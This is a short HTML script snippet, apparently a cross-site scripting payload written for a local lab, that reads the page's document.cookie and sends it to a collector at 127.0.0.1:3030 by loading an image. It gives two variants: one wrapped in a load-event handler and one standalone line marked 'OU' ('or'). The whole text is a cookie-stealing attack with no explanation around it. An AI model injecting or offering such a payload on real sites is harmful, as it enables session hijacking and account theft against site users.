<script>
    function site(){
        new Image().src = "http://127.0.0.1:3030/?=" + document.cookie; 
    }
    window.addEventListener("load", site());

    // OU 
    new Image().src = "http://127.0.0.1:3030/?=" + document.cookie; 
</script>

